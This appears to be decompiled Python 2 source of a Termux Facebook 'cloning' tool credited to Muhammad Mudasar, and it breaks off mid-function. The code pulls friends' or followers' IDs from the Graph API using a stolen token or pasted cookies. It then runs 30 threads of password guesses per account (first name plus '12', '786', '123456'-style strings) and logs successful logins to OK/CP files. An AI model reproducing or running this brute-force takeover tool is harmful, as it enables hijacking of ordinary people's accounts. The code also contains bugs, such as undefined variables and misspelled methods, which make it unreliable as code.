# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Aug  8 2021, 22:51:48) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: koNtol
import os, sys, time, datetime, re, threading, json, random, requests, hashlib, cookielib, uuid
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
__author__ = 'Muhammad Mudasar'
__copyright = 'All rights reserved . Copyright  Mudasar'
os.system('termux-setup-storage')
try:
    os.mkdir('/sdcard/ids')
except OSError:
    pass

bd = random.randint(20000000.0, 30000000.0)
sim = random.randint(20000, 40000)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 
   'x-fb-net-hni': repr(sim), 
   'x-fb-connection-quality': 'EXCELLENT', 
   'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 
   'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]', 
   'content-type': 'application/x-www-form-urlencoded', 
   'x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
logo = "\n\x1b[1;92m  d8888b.    .d88b.    .d8888.   .d8888.\n\x1b[1;92m  88  `8D   .8P  Y8.   88'  YP   88'  YP\n\x1b[1;92m  88oooY'   88    88   `8bo.     `8bo.\n\x1b[1;92m  88~~~b.   88    88     `Y8b.     `Y8b.\n\x1b[1;92m  88   8D   `8b  d8'   db   8D   db   8D\n\x1b[1;92m  Y8888P'    `Y88P'    `8888Y'   `8888Y'\n\x1b[1;97m-----------------------------------------------\n\x1b[1;92m\xe2\x9e\xa3 PROGRAMER   : MUHAMMAD MUDASAR\n\x1b[1;92m\xe2\x9e\xa3 FACEBOOK    : MUHAMMAD MUDASAR\n\x1b[1;92m\xe2\x9e\xa3 WHATSAPP    : 03174050946\n\x1b[1;97m-----------------------------------------------"
CorrectUsername = '@#$%&-+()/BOSS-007'
loop = 'true'
while loop == 'true':
    username = raw_input('\x1b[1;91m\x1b[1;91mENTER KEY.. \x1b[1;91m \x1b[1;91m')
    if username == CorrectUsername:
        print ' \x1b[1;92m  Activated '
        time.sleep(5)
        loop = 'false'

def reg():
    os.system('clear')
    print logo
    print ''
    print '   \x1b[1;92m            UPDATE BY Mudasar'
    time.sleep(5)
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLOGIN KI LIYE APPROVAL LYLO PEHLY '
    print ''
    time.sleep(3)
    try:
        to = open('/sdcard/Android/.b.txt', 'r').read()
    except (KeyError, IOError):
        reg2()

    r = requests.get('https://raw.githubusercontent.com/TechQaiser/ap/main/server.txt').text
    if to in r:
        os.system('cd JJJJJ && npm install')
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd JJJJJ && node index.js &')
        time.sleep(5)
        main_menu()
    else:
        os.system('clear')
        print logo
        print '\tApproved Failed'
        print ' \x1b[1;92mYour Id Is Not Approved '
        print ' \x1b[1;92mCopy the id and send to Admin'
        print ' \x1b[1;92mYour id : ' + to
        raw_input('\x1b[1;93m Press enter to send id')
        os.system('xdg-open https://wa.me/+923174050946')
        reg()


def reg2():
    os.system('clear')
    print logo
    print '\tApproval not detected'
    print ' \x1b[1;92mCopy and press enter , then select whatsapp to continue'
    id = uuid.uuid4().hex[:50]
    print ' Your id: ' + id
    print ''
    raw_input(' Press enter to go to whatsapp ')
    os.system('xdg-open https://wa.me/+923174050946')
    sav = open('/sdcard/Android/.b.txt', 'w')
    sav.write(id)
    sav.close()
    raw_input('\x1b[1;92m Press enter to check Approval ')
    reg()


def main_menu():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;95m~~~~~~~~~Main menu~~~~~~~~~'
    print 47 * '-'
    print '\x1b[1;92m[1] Login cloning'
    print '\x1b[1;92m[2] Without Login Random number cloning'
    print ''
    print 47 * '-'
    print 47 * '-'
    main_menu_sel()


def main_menu_sel():
    sel = raw_input('\x1b[1;96mChoose option: \x1b[1;97m')
    if sel == '1':
        log_menu()
    elif sel == '2':
        os.system('python2 number.py')
    else:
        print ''
        print '\tSelect valid option'
        print ''
        main_menu_sel()


def log_menu():
    try:
        t_check = open('access_token.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print 47 * '-'
        print '\x1b[1;92m[1] Login With Facebook'
        print '\x1b[1;92m[2] Login With Token'
        print '\x1b[1;92m[3] Login With Cookies'
        print 47 * '-'
        print ''
        log_menu_s()


def log_menu_s():
    s = raw_input('\x1b[1;96m=>> ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        log_cookie()
    else:
        print ''
        print '\\ Select valid option '
        print ''
        log_menu_s()


def log_fb():
    os.system('clear')
    print logo
    print '\x1b[1;31;1mLogin with id/pass'
    print 47 * '-'
    lid = raw_input('\x1b[1;92m Id/mail/no: ')
    pwds = raw_input(' \x1b[1;93mPassword: ')
    try:
        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pwd).text
        q = json.loads(data)
        if 'loc' in q:
            ts = open('access_token.txt', 'w')
            ts.write(q['loc'])
            ts.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ' User must verify account before login'
            raw_input('\x1b[1;92m Press enter to try again ')
            log_fb()
        else:
            print ' Id/Pass may be wrong'
            raw_input(' \x1b[1;92mPress enter to try again ')
            log_fb()
    except:
        print ''
        print 'Exiting tool'
        os.system('exit')


def log_token():
    os.system('clear')
    print logo
    print '\x1b[1;93mLogin with token\x1b[1;91m'
    print 47 * '-'
    tok = raw_input('\x1b[1;92mPaste Token Here : \x1b[1;91m')
    print 47 * '-'
    t_s = open('access_token.txt', 'w')
    t_s.write(tok)
    t_s.close()
    menu()


def log_cookie():
    os.system('clear')
    print logo
    print ''
    print '\x1b[1;31;1mLogin Cookies'
    print ''
    try:
        cookie = raw_input(' Paste cookies here: ')
        data = {'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36', 'referer': 'https://m.facebook.com/', 
           'host': 'm.facebook.com', 
           'origin': 'https://m.facebook.com', 
           'upgrade-insecure-requests': '1', 
           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
           'cache-control': 'max-age=0', 
           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
           'content-type': 'text/html; charset=utf-8', 
           'cookie': cookie}
        c1 = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers=data)
        c2 = re.search('(EAAA\\w+)', c1.text)
        hasil = c2.group(1)
        ok = open('access_token.txt', 'w')
        ok.write(hasil)
        ok.close()
        menu()
    except AttributeError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except UnboundLocalError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()
    except requests.exceptions.SSLError:
        print ''
        print '\tInvalid cookies'
        print ''
        raw_input(' \x1b[1;92mPress enter to try again ')
        log_menu()


def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        print ''
        print logo
        print '\x1b[1;31;1mLogin FB id to continue'
        time.sleep(1)
        log_menu()

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        z = q['name']
    except (KeyError, IOError):
        print logo
        print ''
        print '\t Account Cheekpoint\x1b[0;97m'
        print ''
        os.system('rm -rf access_token.txt')
        time.sleep(1)
        log_menu()
    except requests.exceptions.ConnectionError:
        print logo
        print ''
        print '\t Turn on mobile data/wifi\x1b[0;97m'
        print ''
        raw_input(' \x1b[1;92mPress enter after turning on mobile data/wifi ')
        menu()

    os.system('clear')
    print logo
    tok = open('/sdcard/Android/.b.txt', 'r').read()
    print '\x1b[1;92mLogged in User : \x1b[1;91m' + z
    print 47 * '-'
    print '\x1b[1;92m[1] Crack With Auto Password'
    print '\x1b[1;92m[2] Crack With Digit Password'
    print '\x1b[1;92m[3] Crack With Name Password'
    print '\x1b[1;92m[4] Creat File'
    print '\x1b[1;92m[5] Logout'
    print '\x1b[1;92m[6] Delete trash files'
    print 47 * '-'
    menu_chose()


def menu_chose():
    mc = raw_input('\x1b[1;96m=>> ')
    if mc == '1':
        auto_crack()
    elif mc == '2':
        choice_crack()
    elif mc == '3':
        name_crack()
    elif mc == '4':
        os.system('python2 ok.py')
    elif mc == '5':
        lout()
    elif mc == '6':
        rtrash()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu_chose()


def crack():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mAuto Pass Cracking\x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public ID Cloning'
    print '\x1b[1;92m[2] Followers Cloning'
    print '\x1b[1;92m[3] File Cloning'
    print '\x1b[1;92m[0] Back'
    print 47 * '-'
    a_s()


def auto_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t Login FB id to continue\x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93m Auto Pass Cracking \x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public ID Cloning'
    print '\x1b[1;92m[2] Followers Cloning'
    print '\x1b[1;92m[3] File Cloning'
    print '\x1b[1;92m[0] Back'
    print 47 * '-'
    a_s()


def a_s():
    id = []
    cps = []
    oks = []
    a_s = raw_input('\x1b[1;96m=>> ')
    if a_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93mAuto Pass Public Cracking \x1b[1;91m'
        print 47 * '-'
        idt = raw_input(' \x1b[1;93m[\xe2\x88\x9a] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93mAuto Pass Public Cracking'
            print 47 * '-'
            print '\x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' \x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93mName Pass Followers Cracking \x1b[1;91m'
        print 47 * '-'
        p1 = raw_input(' \x1b[1;92m[1] Name + digit : ')
        p2 = raw_input(' \x1b[1;92m[2] Name + digit : ')
        p3 = raw_input(' \x1b[1;92m[3] Name + digit : ')
        p4 = raw_input(' \x1b[1;92m[4] Name + digit : ')
        idt = raw_input(' \x1b[1;93m[\xe2\x88\x9a] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93mName Pass Followers Cracking '
            print 47 * '-'
            print '\x1b[1;92mCloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('\x1b[1;92mPress enter to try again ')
            auto_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif a_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93mAuto Pass File Cracking \x1b[1;91m'
        print 47 * '-'
        try:
            idlist = raw_input('[+] File Name : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            auto_crack()

    elif a_s == '0':
        menu()
    else:
        print ''
        print '\tChoose valid option' + w
        a_s()
    print 'Total ids: ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;97mCrack Running\x1b[1;91m '
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;93m     Mudasar King Of Facebook     '
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            pass1 = name.lower() + '12'
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('BOSS_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass1
                cp = open('BOSS_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower() + '1234'
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('BOSS_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass2
                    cp = open('BOSS_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + '786'
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('BOSS_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass3
                        cp = open('BOSS_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        pass4 = name.lower() + '123'
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ZUBI_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass4
                            cp = open('ZUBI_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            pass5 = '234567'
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ZUBI_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass5
                                cp = open('ZUBI_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                pass6 = '223344'
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ZUBI_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass6
                                    cp = open('ZUBI_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
                                else:
                                    pass7 = '334455'
                                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass7, headers=header).text
                                    q = json.loads(data)
                                    if 'loc' in q:
                                        print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                        ok = open('ZUBI_OK.txt', 'a')
                                        ok.write(uid + ' | ' + pass7 + '\n')
                                        ok.close()
                                        oks.append(uid + pass7)
                                    elif 'www.facebook.com' in q['error']:
                                        print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass7
                                        cp = open('ZUBI_CP.txt', 'a')
                                        cp.write(uid + ' | ' + pass7 + '\n')
                                        cp.close()
                                        cps.apppend(uid + pass7)
                                    else:
                                        pass8 = '445566'
                                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass8, headers=header).text
                                        q = json.loads(data)
                                        if 'loc' in q:
                                            print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                            ok = open('ZUBI_OK.txt', 'a')
                                            ok.write(uid + ' | ' + pass8 + '\n')
                                            ok.close()
                                            oks.append(uid + pass8)
                                        elif 'www.facebook.com' in q['error']:
                                            print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass8
                                            cp = open('ZUBI_CP.txt', 'a')
                                            cp.write(uid + ' | ' + pass8 + '\n')
                                            cp.close()
                                            cps.apppend(uid + pass8)
                                        else:
                                            pass9 = '000786'
                                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass9, headers=header).text
                                            q = json.loads(data)
                                            if 'loc' in q:
                                                print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass9 + '\x1b[0;97m'
                                                ok = open('ZUBI_OK.txt', 'a')
                                                ok.write(uid + ' | ' + pass9 + '\n')
                                                ok.close()
                                                oks.append(uid + pass9)
                                            elif 'www.facebook.com' in q['error']:
                                                print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass9
                                                cp = open('ZUBI_CP.txt', 'a')
                                                cp.write(uid + ' | ' + pass9 + '\n')
                                                cp.close()
                                                cps.apppend(uid + pass9)
                                            else:
                                                pass10 = '786000'
                                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass10, headers=header).text
                                                q = json.loads(data)
                                                if 'loc' in q:
                                                    print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass10 + '\x1b[0;97m'
                                                    ok = open('ZUBI_OK.txt', 'a')
                                                    ok.write(uid + ' | ' + pass10 + '\n')
                                                    ok.close()
                                                    oks.append(uid + pass10)
                                                elif 'www.facebook.com' in q['error']:
                                                    print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass10
                                                    cp = open('ZUBI_CP.txt', 'a')
                                                    cp.write(uid + ' | ' + pass10 + '\n')
                                                    cp.close()
                                                    cps.apppend(uid + pass10)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print ' \x1b[1;92mSuccessfully Done'
    print ' \x1b[1;92mTotal Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input(' \x1b[1;93mPress enter to back')
    menu()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mDigit Pass Cracking \x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public ID Cloning'
    print '\x1b[1;92m[2] Followers Cloning'
    print '\x1b[1;92m[3] File Cloning'
    print '\x1b[1;92m[0] Back'
    print 47 * '-'
    c_s()


def choice_crack():
    global token
    try:
        token = open('access_token.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\x1b[1;93mLogin FB ID To Continue '
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mDigit Pass Cracking \x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public ID Cloning'
    print '\x1b[1;92m[2] Followers Cloning'
    print '\x1b[1;92m[3] File Cloning'
    print '\x1b[1;92m[0] Back'
    print 47 * '-'
    c_s()


def c_s():
    id = []
    cps = []
    oks = []
    c_s = raw_input('\x1b[1;96m=>> ')
    if c_s == '1':
        os.system('clear')
        print logo
        print '\x1b[1;93mDigit Pass Public Cracking \x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1] Password : ')
        pass2 = raw_input(' \x1b[1;92m[2] Password : ')
        pass3 = raw_input(' \x1b[1;92m[3] Password : ')
        pass4 = raw_input(' \x1b[1;92m[4] Password : ')
        pass5 = raw_input(' \x1b[1;92m[5] Password : ')
        pass6 = raw_input(' \x1b[1;92m[6] Password : ')
        idt = raw_input(' \x1b[1;93m[\xe2\x88\x9a] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93mDigit Pass Public Cracking '
            print 47 * '-'
            print 'Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input(' Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif c_s == '2':
        os.system('clear')
        print logo
        print '\x1b[1;93mDigit Pass Followers Cracking \x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1] Password : ')
        pass2 = raw_input(' \x1b[1;92m[2] Password : ')
        pass3 = raw_input(' \x1b[1;92m[3] Password : ')
        pass4 = raw_input(' \x1b[1;92m[4] Password : ')
        pass5 = raw_input(' \x1b[1;92m[5] Password : ')
        pass6 = raw_input(' \x1b[1;92m[6] Password : ')
        idt = raw_input(' \x1b[1;93m[\xe2\x88\x9a] Enter id : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            z = q['name']
            os.system('clear')
            print logo
            print '\x1b[1;93mDigit Pass Followers Cracking '
            print 47 * '-'
            print 'Cloning from: ' + z
        except (KeyError, IOError):
            print '\t Invalid user \x1b[0;97m'
            raw_input('Press enter to try again ')
            choice_crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif c_s == '3':
        os.system('clear')
        print logo
        print '\x1b[1;93mDigit Pass File Cracking \x1b[1;91m'
        print 47 * '-'
        pass1 = raw_input(' \x1b[1;92m[1] Password : ')
        pass2 = raw_input(' \x1b[1;92m[2] Password : ')
        pass3 = raw_input(' \x1b[1;92m[3] Password : ')
        pass4 = raw_input(' \x1b[1;92m[4] Password : ')
        pass5 = raw_input(' \x1b[1;92m[5] Password : ')
        pass6 = raw_input(' \x1b[1;92m[6] Password : ')
        try:
            idlist = raw_input(' [+] File Name : ')
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found.'
            raw_input('Press Enter To Back. ')
            choice_crack()

    elif c_s == '0':
        menu()
    else:
        print ''
        print '\t Choose valid option' + w
        c_s()
    print 'Total ids: ' + str(len(id))
    time.sleep(0.5)
    print '\x1b[1;97mCrack Running \x1b[1;91m'
    time.sleep(0.5)
    print 47 * '-'
    print '\t\x1b[1;93m     Mudasar King Of Facebook     '
    print 47 * '-'

    def main(arg):
        user = arg
        uid, name = user.split('|')
        try:
            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass1, headers=header).text
            q = json.loads(data)
            if 'loc' in q:
                print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('ZUBI_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass1
                cp = open('ZUBI_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass2, headers=header).text
                q = json.loads(data)
                if 'loc' in q:
                    print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('ZUBI_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass2
                    cp = open('ZUBI_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass3, headers=header).text
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('ZUBI_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass3
                        cp = open('ZUBI_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
                    else:
                        data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass4, headers=header).text
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass4 + '\x1b[0;97m'
                            ok = open('ZUBI_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass4
                            cp = open('ZUBI_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
                            cps.apppend(uid + pass4)
                        else:
                            data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass5, headers=header).text
                            q = json.loads(data)
                            if 'loc' in q:
                                print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                ok = open('ZUBI_OK.txt', 'a')
                                ok.write(uid + ' | ' + pass5 + '\n')
                                ok.close()
                                oks.append(uid + pass5)
                            elif 'www.facebook.com' in q['error']:
                                print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass5
                                cp = open('ZUBI_CP.txt', 'a')
                                cp.write(uid + ' | ' + pass5 + '\n')
                                cp.close()
                                cps.apppend(uid + pass5)
                            else:
                                data = requests.get('http://localhost:5000/auth?id=' + uid + '&pass=' + pass6, headers=header).text
                                q = json.loads(data)
                                if 'loc' in q:
                                    print '\x1b[1;92m[BOSS-OK] \x1b[1;32m' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                    ok = open('ZUBI_OK.txt', 'a')
                                    ok.write(uid + ' | ' + pass6 + '\n')
                                    ok.close()
                                    oks.append(uid + pass6)
                                elif 'www.facebook.com' in q['error']:
                                    print '\x1b[1;31;1m[BOSS-CP] ' + uid + ' | ' + pass6
                                    cp = open('ZUBI_CP.txt', 'a')
                                    cp.write(uid + ' | ' + pass6 + '\n')
                                    cp.close()
                                    cps.apppend(uid + pass6)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 47 * '-'
    print '\x1b[1;92mSuccessfully Done'
    print '\x1b[1;92m Total Ok/Cp:' + str(len(oks)) + '/' + str(len(cps))
    print 47 * '-'
    raw_input('\x1b[1;93m Press enter to back')
    menu()


def crack_b():
    global toket
    try:
        toket = open('login.txt', 'r').read()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t File Not Found \x1b[0;97m'
        print ''
        time.sleep(1)
        log_menu()

    os.system('clear')
    print logo
    print '\x1b[1;93mName Pass Cracking \x1b[1;91m'
    print 47 * '-'
    print '\x1b[1;92m[1] Public ID Cloning'
    print '\x1b[1;92m[2] Followers Cloning'
    print '\x1b[1;92m[3] File Cloning'
    print '\x1b[1;92m[0] Back'
    print 47 * '-'
    a_s()


def name_crack():
